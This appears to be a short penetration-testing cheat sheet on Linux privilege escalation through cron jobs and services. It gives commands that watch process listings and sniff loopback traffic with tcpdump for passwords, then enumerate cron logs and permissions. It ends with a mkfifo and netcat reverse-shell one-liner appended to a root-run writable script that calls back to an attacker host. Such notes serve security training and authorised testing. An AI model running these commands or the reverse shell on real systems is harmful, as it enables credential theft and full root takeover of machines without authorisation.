# Cron Jobs & Services

## Watch Processes for Credential Leakage

```bash
watch -n 1 "ps -aux | grep pass"
```

**Sniff local traffic for passwords:**

```bash
sudo tcpdump -i lo -A | grep "pass"
```

***

### Running processes

```
# Watch out for processes running as root
# This spots hidden arguments aswell
ps auxww
```

## Cron Job Abuse (Insecure File Permissions)

```bash
cat /var/log/cron.log
# If we are members of adm group (we can read sensitive log files)
grep "CRON" /var/log/syslog
# 
ls -lha /etc/cron*
```

If a root cron job runs a script you can write to, inject a reverse shell:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc <ip> 1234 >/tmp/f" >> user_backups.sh
```

